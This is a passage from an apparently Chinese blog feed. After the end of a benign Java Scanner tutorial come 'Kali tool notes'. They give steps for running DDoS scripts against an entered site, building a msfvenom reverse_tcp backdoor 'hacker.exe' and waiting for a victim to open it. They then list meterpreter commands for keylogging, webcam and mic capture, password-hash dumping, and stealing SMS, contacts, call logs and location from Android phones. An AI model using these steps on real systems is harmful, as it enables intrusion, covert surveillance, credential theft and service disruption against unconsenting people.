cin.close();<br><span class="hljs-comment">//输入</span><br>lichengloong com<br><span class="hljs-comment">//输出</span><br>lichengloong com<br></code></pre></div></td></tr></table></figure><h3 id="3-next-与-nextLine-区别"><a href="#3-next-与-nextLine-区别" class="headerlink" title="3.next() 与 nextLine() 区别"></a>3.next() 与 nextLine() 区别</h3><p><strong>next()：</strong></p><blockquote><p>1、一定要读取到有效字符后才可以结束输入。<br>2、对输入有效字符之前遇到的空白，next() 方法会自动将其去掉。<br>3、只有输入有效字符后才将其后面输入的空白作为分隔符或者结束符。<br>next() 不能得到带有空格的字符串。</p></blockquote><p><strong>nextLine()：</strong></p><blockquote><p>1、以Enter为结束符,也就是说 nextLine()方法返回的是输入回车之前的所有字符。<br>2、可以获得空白。</p></blockquote><p>如果要输入 int 或 float 类型的数据，在 Scanner 类中也有支持。但是在输入之前最好先使用 hasNextXxx() 方法进行验证，再使用 nextXxx() 来读取。</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ScannerDemo</span> </span>&#123;  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;  <br>        Scanner scan = <span class="hljs-keyword">new</span> Scanner(System.in);  <br><span class="hljs-comment">// 从键盘接收数据  </span><br>        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ;  <br>        <span class="hljs-keyword">float</span> f = <span class="hljs-number">0.0f</span> ;  <br>        System.out.print(<span class="hljs-string">&quot;输入整数：&quot;</span>);  <br>        <span class="hljs-keyword">if</span>(scan.hasNextInt())&#123;                 <br><span class="hljs-comment">// 判断输入的是否是整数  </span><br>            i = scan.nextInt() ;                <br><span class="hljs-comment">// 接收整数  </span><br>            System.out.println(<span class="hljs-string">&quot;整数数据：&quot;</span> + i) ;  <br>        &#125;<span class="hljs-keyword">else</span>&#123;                                 <br><span class="hljs-comment">// 输入错误的信息  </span><br>            System.out.println(<span class="hljs-string">&quot;输入的不是整数！&quot;</span>) ;  <br>        &#125;  <br>        System.out.print(<span class="hljs-string">&quot;输入小数：&quot;</span>);  <br>        <span class="hljs-keyword">if</span>(scan.hasNextFloat())&#123;              <br><span class="hljs-comment">// 判断输入的是否是小数  </span><br>            f = scan.nextFloat() ;             <br><span class="hljs-comment">// 接收小数  </span><br>            System.out.println(<span class="hljs-string">&quot;小数数据：&quot;</span> + f) ;  <br>        &#125;<span class="hljs-keyword">else</span>&#123;                                <br><span class="hljs-comment">// 输入错误的信息  </span><br>            System.out.println(<span class="hljs-string">&quot;输入的不是小数！&quot;</span>) ;  <br>        &#125;  <br>    &#125;  <br>&#125; <br><span class="hljs-comment">/*输出结果*/</span><br>输入整数：<span class="hljs-number">12</span><br>整数数据：<span class="hljs-number">12</span><br>输入小数：<span class="hljs-number">1.2</span><br>小数数据：<span class="hljs-number">1.2</span><br></code></pre></div></td></tr></table></figure><p>使用实例：输入非数字来结束输入。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner; <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ScannerDemo</span>   </span><br><span class="hljs-class"></span>&#123;  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span>   </span><br><span class="hljs-function">    </span>&#123;  <br>        Scanner scan = <span class="hljs-keyword">new</span> Scanner(System.in);  <br>  <br>        <span class="hljs-keyword">double</span> sum = <span class="hljs-number">0</span>;  <br>        <span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>;  <br>  <br>        <span class="hljs-keyword">while</span>(scan.hasNextDouble())  <br>        &#123;  <br>            <span class="hljs-keyword">double</span> x = scan.nextDouble();  <br>            m = m + <span class="hljs-number">1</span>;  <br>            sum = sum + x;  <br>        &#125;  <br>  <br>        System.out.println(m+<span class="hljs-string">&quot;个数的和为&quot;</span>+sum);  <br>        System.out.println(m+<span class="hljs-string">&quot;个数的平均值是&quot;</span>+(sum/m));  <br>    &#125;  <br>&#125;  <br><span class="hljs-comment">/*输出结果*/</span><br><span class="hljs-number">12</span><br><span class="hljs-number">23</span><br><span class="hljs-number">15</span><br><span class="hljs-number">21.4</span><br>end<br><span class="hljs-number">4</span>个数的和为<span class="hljs-number">71.4</span><br><span class="hljs-number">4</span>个数的平均值是<span class="hljs-number">17.85</span><br></code></pre></div></td></tr></table></figure><p>输入的时候字符都是可见的，所以Scanner类不适合从控制台读取密码。从Java SE 6开始特别引入了Console类来实现这个目的。具体用法可自行百度。需要注意的是，在Eclipse中用此方法是会报错的。如果直接在集成开发环境下执行代码会报错。如下：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Exception in thread <span class="hljs-string">&quot;main&quot;</span> java.lang.NullPointerException<br></code></pre></div></td></tr></table></figure><p>可以直接在命令提示符中采用javac XX.java , java XX的方式运行代码，可获得想要的效果。<br>采用Console对象处理输入不如采用Scanner方便。每次只能读取一行输入，而没有能够读取一个单词或者一个数值的方法。</p><h3 id="4-主动对输入字符串进行分割"><a href="#4-主动对输入字符串进行分割" class="headerlink" title="4.主动对输入字符串进行分割"></a>4.主动对输入字符串进行分割</h3><p>通过StringTokenizer类可以分解输入的整行得到的带空格的字符串。默认情况下，StringTokenizer以空格，制表符，换行符和回车符作为分割依据。StringTokenizer类属于 java.util 包。</p><p><strong>例一</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">import</span> java.util.StringTokenizer;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Scanner scanner=<span class="hljs-keyword">new</span> Scanner(System.in);<br>        System.out.println(<span class="hljs-string">&quot;输入数据：&quot;</span>);<br>        StringTokenizer stringTokenizer=<span class="hljs-keyword">new</span> StringTokenizer(scanner.nextLine());<br>        System.out.println(<span class="hljs-string">&quot;分隔后：&quot;</span>);<br>        <span class="hljs-keyword">while</span>(stringTokenizer.hasMoreTokens())&#123; <span class="hljs-comment">//hasMoreTokens()该方法是用来判断是否还有分隔符，返回值是布尔。</span><br>            System.out.println(stringTokenizer.nextToken());<span class="hljs-comment">//nextToken() 用于返回下一个匹配的字段。</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//输入</span><br>lichengloong com<br><span class="hljs-comment">//输出</span><br>lichengloong<br>com<br></code></pre></div></td></tr></table></figure><p><strong>例二</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        StringTokenizer st = <span class="hljs-keyword">new</span> StringTokenizer(<span class="hljs-string">&quot;www.lichengloong.com&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>        <span class="hljs-keyword">while</span> (st.hasMoreTokens()) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Token:&quot;</span> + st.nextToken());<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出</span><br>Token:www<br>Token:lichengloong<br>Token:com<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kali-Pentmenu</title>
    <link href="/2021/04/11/Kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Kali-Ddos-Pentmenu/"/>
    <url>/2021/04/11/Kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Kali-Ddos-Pentmenu/</url>
    
    <content type="html"><![CDATA[<p>Kali Linux 工具使用笔记。以下均是在Kali Linux 2020版本中实现。</p><h1 id="安装Pentmenu"><a href="#安装Pentmenu" class="headerlink" title="安装Pentmenu"></a>安装Pentmenu</h1><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">git clone https:<span class="hljs-comment">//github.com/GinjaChris/pentmenu       </span><br></code></pre></div></td></tr></table></figure><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span> cd pentmenu   <br><span class="hljs-number">2.</span> ./pentmenu  <br><span class="hljs-number">3.</span> 选用<span class="hljs-number">2</span><br><span class="hljs-number">4.</span>根据情况选择(这里选择<span class="hljs-number">9</span>)<br><span class="hljs-number">5.</span>输入网址或IP<br><span class="hljs-number">6.</span>输入端口(一般<span class="hljs-number">80</span>即可)<br><span class="hljs-number">7.</span>输入发包的数量(默认<span class="hljs-number">2000</span>)<br><br><span class="hljs-number">8.</span>没说的可以直接回车<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali工具使用笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kali-Ddos-Attack</title>
    <link href="/2021/04/11/Kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Kali-Ddos-attack/"/>
    <url>/2021/04/11/Kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Kali-Ddos-attack/</url>
    
    <content type="html"><![CDATA[<p>Kali Linux 工具使用笔记。以下均是在Kali Linux 2020版本中实现。</p><h1 id="安装DDOS-Attack"><a href="#安装DDOS-Attack" class="headerlink" title="安装DDOS-Attack"></a>安装DDOS-Attack</h1><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">git clone https:<span class="hljs-comment">//github.com/Ha3MrX/DDos-Attack</span><br></code></pre></div></td></tr></table></figure><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h4 id="在终端输入"><a href="#在终端输入" class="headerlink" title="在终端输入"></a>在终端输入</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>进入DDOS-Attack文件<br>cd DDOS-Attack<br><span class="hljs-number">2.</span>设置权限<br>chmod +x ddos-attack.py<br><span class="hljs-number">3.</span>启用<br>python ddos-attack.py<br><span class="hljs-number">4.</span>在出现的界面内输入网址或IP<br><span class="hljs-number">5.</span>再输入端口号(一般是<span class="hljs-number">80</span>)<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali工具使用笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kali-WPScan(WordPress网址攻击)</title>
    <link href="/2021/04/11/Kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Kali-WPScan(WordPress%E7%BD%91%E5%9D%80%E6%94%BB%E5%87%BB)/"/>
    <url>/2021/04/11/Kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Kali-WPScan(WordPress%E7%BD%91%E5%9D%80%E6%94%BB%E5%87%BB)/</url>
    
    <content type="html"><![CDATA[<p>Kali Linux 工具使用笔记。以下均是在Kali Linux 2020版本中实现。</p><h1 id="安装WPScan"><a href="#安装WPScan" class="headerlink" title="安装WPScan"></a>安装WPScan</h1><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">apt-get update<br>apt-get install wpscan<br></code></pre></div></td></tr></table></figure><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali工具使用笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kali-MSF入侵</title>
    <link href="/2021/04/11/Kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Kali-MSF%E5%85%A5%E4%BE%B5/"/>
    <url>/2021/04/11/Kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Kali-MSF%E5%85%A5%E4%BE%B5/</url>
    
    <content type="html"><![CDATA[<p>Kali Linux 工具使用笔记。以下均是在Kali Linux 2020版本中实现。</p><h1 id="MSF入侵电脑"><a href="#MSF入侵电脑" class="headerlink" title="MSF入侵电脑"></a>MSF入侵电脑</h1><h2 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">msfvenom<br>msfconsole<br></code></pre></div></td></tr></table></figure><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span> 生成后门文件 hacker.exe<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=本地IP LPORT=端口  -f exe -o hacker.exe <span class="hljs-comment">//端口8888或4444等,ifconfig查看本地IP</span><br>参数：<br>-p payloads<br>-f 输出格式<br>-o 输入地址<br>-e 编码方式（msfvenom -l -encoder 可以查看能使用的编码）<br>-x | -k 绑定程序 （例如 –x C:\nomal.exe –k –f exe –o C:\shell.exe）<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">2.</span> 给予权限<br>chmod <span class="hljs-number">777</span> hacker.exe<br></code></pre></div></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">3.</span> 执行命令：<br>①运行msfconsole<br>msfconsole<br>②选择模块<br>msf &gt; use exploit/multi/handler<br>③ <span class="hljs-built_in">set</span> lhost 本地IP<br>④ <span class="hljs-built_in">set</span> lport 端口号<br>⑤后台执行<br>msf exploit(handler) &gt; exploit -z -j <br></code></pre></div></td></tr></table></figure><h3 id="这个时候等待目标打开我们的hacker-exe，打开即上钩了"><a href="#这个时候等待目标打开我们的hacker-exe，打开即上钩了" class="headerlink" title="这个时候等待目标打开我们的hacker.exe，打开即上钩了"></a>这个时候等待目标打开我们的hacker.exe，打开即上钩了</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">4.</span>查看上钩的用户<br><span class="hljs-function">msf <span class="hljs-title">exploit</span><span class="hljs-params">(handler)</span> &gt; sessions</span><br>5.选择需要攻击的用户，这里选择第 1 个<br>msf exploit(handler) &gt; sessions -i 1<br><span class="hljs-number">6.</span>执行shell<br><span class="hljs-number">7.</span>meterpreter &gt; shell <br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">file&gt;dir<br></code></pre></div></td></tr></table></figure><h4 id="进入meterpreter之后即可进行一些相关木马操作"><a href="#进入meterpreter之后即可进行一些相关木马操作" class="headerlink" title="进入meterpreter之后即可进行一些相关木马操作"></a>进入meterpreter之后即可进行一些相关木马操作</h4><p>首先可以查看帮助文档，命令“help”，挑常用操作来讲↓↓↓</p><hr><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">用户操作：Stdapi: User interface Commands（用户接口命令）<br>enumdesktops    --&gt;列出所有可访问的桌面和窗口站（窗体列表）<br>getdesktop      --&gt;得到当前的Meterpreter桌面<br>idletime        --&gt;返回秒远程用户已经闲置数量<br>keyscan_start   --&gt;开始捕获击键（开始键盘记录）<br>keyscan_dump    --&gt;转储按键缓冲（下载键盘记录）<br>keyscan_stop    --&gt;停止捕获击键（停止键盘记录）<br><br>PS：键盘记录注意点，先开始，后下载，再结束，否则会出错<br>screenshot      --&gt;抓取交互式桌面截图（当前操作界面截图一张）<br>setdesktop      --&gt;改变meterpreters当前桌面<br>uictl           --&gt;控制一些用户界面组件（获取键盘、鼠标控制权）<br>使用uictl -h 查看帮助（打开/关闭，键盘/鼠标）<br><br>摄像头：Stdapi: Webcam Commands（摄像头命令）<br>record_mic       --&gt;X秒从默认的麦克风record_mic音频记录（音频录制）<br>webcam_chat      --&gt;开始视频聊天（视频，对方会有弹窗）<br>webcam_list      --&gt;单摄像头（查看摄像头列表）<br>webcam_snap      --&gt;采取快照从指定的摄像头（摄像头拍摄一张照片）<br>webcam_stream    --&gt;播放视频流从指定的摄像头（开启摄像头监控）<br><br>其他命令操作<br>getsystem        --&gt;获取高权限<br>hashdump         --&gt;获取当前用户hash<br></code></pre></div></td></tr></table></figure><hr><h2 id="第二种用法"><a href="#第二种用法" class="headerlink" title="第二种用法"></a>第二种用法</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span><br>msfpayload windows/meterpreter/reverse_tcp LHOST=本机IP LPORT=<span class="hljs-number">4444</span>端口 x &gt; /root/Desktop/<span class="hljs-number">1.</span>exe<br>这样就会在桌面生成<span class="hljs-number">1.</span>exe 也就是我们的木马<br><span class="hljs-number">2.</span><br>输入msfconsole 进入msf<br><span class="hljs-number">3.</span><br>依次输入以下命令 <br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_top<br><span class="hljs-built_in">set</span> LHOST 本机Ip<br><span class="hljs-comment">//set lport 端口号</span><br>exploit<br>等到windows运行了<span class="hljs-number">1.</span>exe后 就Ok<br><span class="hljs-number">4.</span><br>meterpreter的命令直接-h 看帮助<br></code></pre></div></td></tr></table></figure><h1 id="MSF入侵Android"><a href="#MSF入侵Android" class="headerlink" title="MSF入侵Android"></a>MSF入侵Android</h1><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>开启摄像头<br>  webcam_stream<br><span class="hljs-number">2.</span>导出手机号码<br>  dump_contacts<br><span class="hljs-number">3.</span>导出短信<br>  dump_sms<br><span class="hljs-number">4.</span>通过摄像头拍照功能<br>  webcam_snap<br><span class="hljs-number">5.</span>从目标会话发送短消息<br>  send_sms<br><span class="hljs-number">6.</span>隐秘拍照功能<br>  webcam_snap<br><span class="hljs-number">7.</span>从指定的摄像头获取快照<br>  webcam_snap<br><span class="hljs-number">8.</span>检查设备是否有根<br>  check_root<br><span class="hljs-number">9.</span>隐藏手机端木马程序图标<br>  hide_app_icon<br><span class="hljs-number">10.</span>获取通话记录<br>  dump_calllog<br><span class="hljs-number">11.</span>获取手机的当前的经纬度<br>  geolocate<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali工具使用笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kali-Msfvenom &amp; Msfconsole</title>
    <link href="/2021/04/11/Kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Kali-msfvenom%20&amp;%20msfconsole/"/>
    <url>/2021/04/11/Kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Kali-msfvenom%20&amp;%20msfconsole/</url>
    
    <content type="html"><![CDATA[<p>Kali Linux 工具使用笔记。以下均是在Kali Linux 2020版本中实现。</p><h1 id="安装WPScan"><a href="#安装WPScan" class="headerlink" title="安装WPScan"></a>安装WPScan</h1><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">apt-get update<br>apt-get install wpscan<br></code></pre></div></td></tr></table></figure><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali工具使用笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kali-httrack(网站克隆)</title>
    <link href="/2021/04/11/Kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Kali-httrack(%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86)/"/>
    <url>/2021/04/11/Kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Kali-httrack(%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86)/</url>
    
    <content type="html"><![CDATA[<p>Kali Linux 工具使用笔记。以下均是在Kali Linux 2020版本中实现。</p><h1 id="在Kali-Linux-2020中安装httrack"><a href="#在Kali-Linux-2020中安装httrack" class="headerlink" title="在Kali Linux 2020中安装httrack"></a>在Kali Linux 2020中安装httrack</h1><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>打开终端，输入 sudo su进入root用户<br><span class="hljs-number">2.</span>提示输入密码后输入密码<br><span class="hljs-number">3.</span>再输入 apt-get install httrack进行下载安装即可。<br></code></pre></div></td></tr></table></figure><h2 id="在终端中"><a href="#在终端中" class="headerlink" title="在终端中"></a>在终端中</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">创建存储的文件夹<br>mkdir web <span class="hljs-comment">//web为文件名</span><br></code></pre></div></td></tr></table></figure><h2 id="在httrack中"><a href="#在httrack中" class="headerlink" title="在httrack中"></a>在httrack中</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>输入httrack<br><span class="hljs-number">2.</span>再随便输入一个项目名<br><span class="hljs-number">3.</span>/home/dragon/web <span class="hljs-comment">//2018版本中 /root/web，web为你建的文件夹名</span><br><span class="hljs-number">4.</span>再输入网站的网址或IP<br><span class="hljs-number">5.</span>再选择<span class="hljs-number">1</span>或<span class="hljs-number">2</span>(一般选<span class="hljs-number">1</span>或<span class="hljs-number">2</span>，通常选<span class="hljs-number">2</span>)<br><span 